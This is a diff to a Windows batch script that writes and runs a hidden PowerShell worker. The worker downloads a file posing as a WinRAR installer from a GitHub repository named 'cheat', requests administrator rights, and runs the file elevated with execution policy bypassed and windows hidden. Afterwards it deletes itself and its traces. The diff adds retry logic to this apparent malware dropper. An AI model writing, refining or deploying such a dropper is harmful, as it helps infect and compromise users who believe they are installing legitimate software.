@@ -1,9 +1,9 @@
 @echo off
-setlocal EnableExtensions
+setlocal EnableExtensions DisableDelayedExpansion
 
 set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
 set "HASH=3271c6372c136be4f9e7b276b3cb3b52ed4c408e1abc6405d15551212279dfac"
-set "BASE_TEMP=%USERPROFILE%\AppData\Local\Temp"
+set "BASE_TEMP=%LOCALAPPDATA%\Temp"
 set "WORK_DIR=%BASE_TEMP%\WinRarPkg"
 set "OUT=%WORK_DIR%\WinRar_setup.exe"
 set "PS_SCRIPT=%BASE_TEMP%\winrar_worker.ps1"
@@ -12,107 +12,119 @@ set "RUNNER_BAT=%~f0"
 
 if not exist "%WORK_DIR%" mkdir "%WORK_DIR%" >nul 2>&1
 
-powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
-  "$code = @'" ^
-  "$ErrorActionPreference = 'Stop'" ^
-  "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" ^
-  "" ^
-  "$u = $env:URL" ^
-  "$h = $env:HASH.ToLowerInvariant()" ^
-  "$dir = $env:WORK_DIR" ^
-  "$f = $env:OUT" ^
-  "$log = $env:LOG" ^
-  "$psFile = $env:PS_SCRIPT" ^
-  "$runner = $env:RUNNER_BAT" ^
-  "" ^
-  "function Write-Log([string]$Msg) {" ^
-  "    $line = '[{0}] {1}' -f (Get-Date -Format 'HH:mm:ss'), $Msg" ^
-  "    Add-Content -LiteralPath $log -Value $line -Encoding UTF8" ^
-  "}" ^
-  "" ^
-  "$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)" ^
-  "if (-not $isAdmin) {" ^
-  "    $psiAdmin = New-Object System.Diagnostics.ProcessStartInfo" ^
-  "    $psiAdmin.FileName = 'powershell.exe'" ^
-  "    $psiAdmin.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"' + $psFile + '\"'" ^
-  "    $psiAdmin.Verb = 'RunAs'" ^
-  "    $psiAdmin.UseShellExecute = $true" ^
-  "    $psiAdmin.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden" ^
-  "    [System.Diagnostics.Process]::Start($psiAdmin) | Out-Null" ^
-  "    exit 0" ^
-  "}" ^
-  "" ^
-  "try {" ^
-  "    Write-Log ('Elevated worker started. URL=' + $u)" ^
-  "    if (-not (Test-Path -LiteralPath $dir)) {" ^
-  "        New-Item -ItemType Directory -Path $dir -Force | Out-Null" ^
-  "    }" ^
-  "" ^
-  "    $downloaded = $false" ^
-  "    try {" ^
-  "        Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing" ^
-  "        if ((Test-Path -LiteralPath $f) -and ((Get-Item -LiteralPath $f).Length -gt 0)) {" ^
-  "            $downloaded = $true" ^
-  "        }" ^
-  "    } catch {" ^
-  "        Write-Log ('Invoke-WebRequest failed: ' + $_.Exception.Message)" ^
-  "    }" ^
-  "" ^
-  "    if (-not $downloaded) {" ^
-  "        try {" ^
-  "            $wc = New-Object System.Net.WebClient" ^
-  "            $wc.DownloadFile($u, $f)" ^
-  "            $wc.Dispose()" ^
-  "            if ((Test-Path -LiteralPath $f) -and ((Get-Item -LiteralPath $f).Length -gt 0)) {" ^
-  "                $downloaded = $true" ^
-  "            }" ^
-  "        } catch {" ^
-  "            Write-Log ('WebClient failed: ' + $_.Exception.Message)" ^
-  "        }" ^
-  "    }" ^
-  "" ^
-  "    if (-not $downloaded) {" ^
-  "        Write-Log 'ERROR: Download failed'" ^
-  "        exit 1" ^
-  "    }" ^
-  "" ^
-  "    Write-Log 'Downloaded OK, checking SHA-256'" ^
-  "    $actual = (Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash.ToLowerInvariant()" ^
-  "    if ($actual -ne $h) {" ^
-  "        Write-Log ('ERROR: Hash mismatch. Expected=' + $h + ' Actual=' + $actual)" ^
-  "        Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue" ^
-  "        exit 2" ^
-  "    }" ^
-  "" ^
-  "    Write-Log 'Hash verified, launching executable'" ^
-  "    $proc = Start-Process -FilePath $f -PassThru -Wait" ^
-  "    Write-Log ('Process exited with code ' + $proc.ExitCode)" ^
-  "    exit [int]$proc.ExitCode" ^
-  "} catch {" ^
-  "    Write-Log ('FATAL: ' + $_.Exception.Message)" ^
-  "    exit 99" ^
-  "} finally {" ^
-  "    Start-Sleep -Seconds 2" ^
-  "    if ($dir -and (Test-Path -LiteralPath $dir)) {" ^
-  "        Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue" ^
-  "    }" ^
-  "    if ($runner -and (Test-Path -LiteralPath $runner)) {" ^
-  "        Remove-Item -LiteralPath $runner -Force -ErrorAction SilentlyContinue" ^
-  "    }" ^
-  "    if ($psFile -and (Test-Path -LiteralPath $psFile)) {" ^
-  "        Remove-Item -LiteralPath $psFile -Force -ErrorAction SilentlyContinue" ^
-  "    }" ^
-  "}" ^
-  "'@; [IO.File]::WriteAllText($env:PS_SCRIPT, $code, [Text.UTF8Encoding]::new($false))" >nul 2>&1
+(
+  echo $ErrorActionPreference = 'Stop'
+  echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+  echo.
+  echo $u = $env:URL
+  echo $h = $env:HASH.ToLowerInvariant^(^)
+  echo $dir = $env:WORK_DIR
+  echo $f = $env:OUT
+  echo $log = $env:LOG
+  echo $psFile = $env:PS_SCRIPT
+  echo $runner = $env:RUNNER_BAT
+  echo.
+  echo function Write-Log^([string]$Msg^) {
+  echo     $line = '[{0}] {1}' -f ^(Get-Date -Format 'HH:mm:ss'^), $Msg
+  echo     Add-Content -LiteralPath $log -Value $line -Encoding UTF8
+  echo }
+  echo.
+  echo function Invoke-DownloadFile^([string]$TargetUrl, [string]$OutPath^) {
+  echo     if ^(Test-Path -LiteralPath $OutPath^) {
+  echo         Remove-Item -LiteralPath $OutPath -Force -ErrorAction SilentlyContinue
+  echo     }
+  echo     try {
+  echo         Invoke-WebRequest -Uri $TargetUrl -OutFile $OutPath -UseBasicParsing
+  echo         if ^((Test-Path -LiteralPath $OutPath^) -and ^((Get-Item -LiteralPath $OutPath^).Length -gt 0^)^) {
+  echo             return $true
+  echo         }
+  echo     } catch {
+  echo         Write-Log ^('Invoke-WebRequest failed: ' + $_.Exception.Message^)
+  echo     }
+  echo     try {
+  echo         $wc = New-Object System.Net.WebClient
+  echo         $wc.DownloadFile^($TargetUrl, $OutPath^)
+  echo         $wc.Dispose^(^)
+  echo         if ^((Test-Path -LiteralPath $OutPath^) -and ^((Get-Item -LiteralPath $OutPath^).Length -gt 0^)^) {
+  echo             return $true
+  echo         }
+  echo     } catch {
+  echo         Write-Log ^('WebClient failed: ' + $_.Exception.Message^)
+  echo     }
+  echo     return $false
+  echo }
+  echo.
+  echo $isAdmin = ^([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent^(^)^).IsInRole^([Security.Principal.WindowsBuiltInRole]::Administrator^)
+  echo if ^(-not $isAdmin^) {
+  echo     Write-Log 'Requesting elevation via RunAs'
+  echo     $elevArgs = @(
+  echo         '-NoProfile'
+  echo         '-NonInteractive'
+  echo         '-ExecutionPolicy'
+  echo         'Bypass'
+  echo         '-WindowStyle'
+  echo         'Hidden'
+  echo         '-File'
+  echo         "`"$psFile`""
+  echo     ^)
+  echo     Start-Process -FilePath 'powershell.exe' -ArgumentList $elevArgs -Verb RunAs -WindowStyle Hidden | Out-Null
+  echo     exit 0
+  echo }
+  echo.
+  echo try {
+  echo     Write-Log ^('Elevated worker started. URL=' + $u^)
+  echo     if ^(-not ^(Test-Path -LiteralPath $dir^)^) {
+  echo         New-Item -ItemType Directory -Path $dir -Force ^| Out-Null
+  echo     }
+  echo.
+  echo     $maxRetries = 2
+  echo     $hashOk = $false
+  echo.
+  echo     for ^($attempt = 0; $attempt -le $maxRetries; $attempt++^) {
+  echo         Write-Log ^('Download attempt ' + ^($attempt + 1^) + ' of ' + ^($maxRetries + 1^)^)
+  echo         $ok = Invoke-DownloadFile -TargetUrl $u -OutPath $f
+  echo         if ^(-not $ok^) {
+  echo             Write-Log 'Download failed on this attempt'
+  echo             continue
+  echo         }
+  echo         $actual = ^(Get-FileHash -LiteralPath $f -Algorithm SHA256^).Hash.ToLowerInvariant^(^)
+  echo         if ^($actual -eq $h^) {
+  echo             Write-Log 'SHA-256 verified'
+  echo             $hashOk = $true
+  echo             break
+  echo         } else {
+  echo             Write-Log ^('Hash mismatch. Expected=' + $h + ' Actual=' + $actual^)
+  echo             Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
+  echo         }
+  echo     }
+  echo.
+  echo     if ^(-not $hashOk^) {
+  echo         Write-Log 'ERROR: Hash check failed after retries'
+  echo         exit 2
+  echo     }
+  echo.
+  echo     Write-Log 'Launching executable as administrator'
+  echo     $proc = Start-Process -FilePath $f -Verb RunAs -PassThru -Wait
+  echo     Write-Log ^('Process exited with code ' + $proc.ExitCode^)
+  echo     exit [int]$proc.ExitCode
+  echo } catch {
+  echo     Write-Log ^('FATAL: ' + $_.Exception.Message^)
+  echo     exit 99
+  echo } finally {
+  echo     Start-Sleep -Seconds 2
+  echo     if ^($dir -and ^(Test-Path -LiteralPath $dir^)^) {
+  echo         Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
+  echo     }
+  echo     if ^($runner -and ^(Test-Path -LiteralPath $runner^)^) {
+  echo         Remove-Item -LiteralPath $runner -Force -ErrorAction SilentlyContinue
+  echo     }
+  echo     if ^($psFile -and ^(Test-Path -LiteralPath $psFile^)^) {
+  echo         Remove-Item -LiteralPath $psFile -Force -ErrorAction SilentlyContinue
+  echo     }
+  echo }
+) > "%PS_SCRIPT%"
 
 if not exist "%PS_SCRIPT%" exit /b 1
 
-powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
-  "$psi = New-Object System.Diagnostics.ProcessStartInfo; " ^
-  "$psi.FileName = 'powershell.exe'; " ^
-  "$psi.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"' + $env:PS_SCRIPT + '\"'; " ^
-  "$psi.UseShellExecute = $false; " ^
-  "$psi.CreateNoWindow = $true; " ^
-  "[System.Diagnostics.Process]::Start($psi) | Out-Null" >nul 2>&1
-
+start "" /b powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCRIPT%"
 exit /b 0
